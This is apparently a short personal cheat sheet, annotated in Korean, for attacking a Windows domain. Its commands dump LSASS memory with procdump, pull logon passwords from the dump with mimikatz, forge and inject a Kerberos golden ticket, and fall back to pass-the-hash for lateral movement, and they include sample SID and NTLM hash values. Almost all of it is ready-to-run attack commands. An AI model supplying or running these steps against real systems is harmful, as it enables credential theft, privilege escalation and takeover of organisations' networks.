procdump -accepteula -ma lsass.exe lsassdump
mimikatz.exe
privilege::debug
log sekurlsa.log
sekurlsa::minidump .\lsassdump.dmp
sekurlsa::logonpasswords

kerberos::golden /domain:FAST.local /sid:S-1-5-21-208253956-2375808401-456877107 /rc4:93b17ff3c2450617759f4752e4752a09 /id:500 /user:FakeAdmin
kerberos::ptt ticket.kirbi
misc::cmd
pushd \\HELLO\c$


// 아래서 4번째 라인 설명(Pass the Ticket)
procdump를 통해 얻어낸 값을 sekurlsa 메모장에 저장.
해당 sekurlsa 메모장에서 필요한 SID, rc4(NTLM), id(관리자는 500 default), user(생성할 계정 이름)


// 아래서 4번째 라인 되지 않을 경우(Pass the Hash)
sekurlsa::pth /user:userAD /domain:fast.local /ntlm:7ce21f17c0aee7fb9ceba532d0546ad6
명령어 입력 시 Pass the hash 로 측면이동 가능